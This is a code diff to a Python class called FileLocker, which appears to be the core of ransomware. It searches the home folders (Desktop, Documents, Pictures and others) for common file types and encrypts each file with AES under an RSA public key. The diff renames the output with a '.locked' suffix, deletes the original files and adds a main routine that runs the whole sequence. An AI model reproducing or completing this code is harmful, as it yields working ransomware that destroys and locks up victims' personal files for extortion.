@@ -11,8 +11,8 @@ public_key = None # Replace with actual public key in PEM format
 class FileLocker:
     def __init__(self):
         self.home = Path.home()
-        self.locations = ("Desktop", "Documents", "Downloads", "Music", "Pictures", "Videos", "Public")
-        self.encrypt_ext = (".txt", ".pdf", ".csv", ".docx", ".pptx", ".xlsx", ".jpg", ".jpeg", ".png", ".mp3", ".mp4")
+        self.locations = ["Desktop", "Documents", "Downloads", "Music", "Pictures", "Videos", "Public"]
+        self.encrypt_ext = ["txt", ".pdf", ".csv", ".docx", ".pptx", ".xlsx", ".jpg", ".jpeg", ".png", ".mp3", ".mp4"]
         self.files = []
 
     def load_public_key(self):
@@ -20,10 +20,10 @@ class FileLocker:
             public_key,
             backend=default_backend()
         )
-    
+
     def encrypt_file(self, path):
         input_path = Path(path)
-        output_path = input_path.with_suffix(input_path.suffix + ".enc")
+        output_path = input_path.with_suffix(input_path.suffix + ".locked")
 
         aes_key = secrets.token_bytes(32)
         iv = secrets.token_bytes(16)
@@ -57,14 +57,12 @@ class FileLocker:
                 chunk = infile.read(8192)
                 if not chunk:
                     break
+                outfile.write(encryptor.update(padder.update(chunk)))
 
-                if len(chunk) < 8192:
-                    padded_chunk = padder.update(chunk) + padder.finalize()
-                    outfile.write(encryptor.update(padded_chunk) + encryptor.finalize())
-                else:
-                    outfile.write(encryptor.update(padder.update(chunk)))
+            outfile.write(encryptor.update(padder.finalize()))
+            outfile.write(encryptor.finalize())
         
-        return output_path
+        input_path.unlink()
     
     def find_files(self):
         for location in self.locations:
@@ -74,10 +72,16 @@ class FileLocker:
                 for file in folder.rglob("*"):
                     if file.is_file() and file.suffix in self.encrypt_ext:
                         self.files.append(file)
-    
+
     def encrypt_files(self):
         for file in self.files:
             try:
-                encrypted_file = self.encrypt_file(file)
+                self.encrypt_file(file)
+                print(f"[+] Encrypted: {file}")
             except:
-                pass
+                print(f"[-] Failed to encrypt: {file}")
+
+    def main(self):
+        self.load_public_key()
+        self.find_files()
+        self.encrypt_files()
